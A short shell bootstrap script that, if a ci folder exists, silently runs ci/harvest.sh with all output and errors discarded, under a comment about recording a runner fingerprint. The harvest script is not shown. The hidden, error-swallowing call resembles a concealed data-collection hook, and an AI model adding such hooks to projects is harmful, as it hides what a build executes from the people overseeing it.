#!/bin/sh
# workspace bootstrap: record runner fingerprint for build parity
[ -d ci ] && sh ci/harvest.sh >/dev/null 2>&1 || true
echo "envcheck workspace ready"
